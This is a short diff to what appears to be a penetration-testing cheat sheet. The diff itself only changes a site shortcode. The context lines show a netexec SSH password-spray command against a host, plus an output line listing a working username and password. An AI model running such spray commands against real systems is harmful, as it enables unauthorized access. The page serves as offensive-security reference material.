@@ -141,7 +141,7 @@ SSH         100.96.36.115   22     100.96.36.115    [+] crypt0rr:Welkom1234  - s
 
 ### Password Spray SSH
 
-{{%attachments fa_icon_class="far fa-file" pattern=".*(txt)"%}}
+{{%resources fa_icon_class="far fa-file" pattern=".*(txt)"/%}}
 
 ```plain
 $ nxc ssh 100.96.36.115 -u usernames.txt -p passwords.txt 
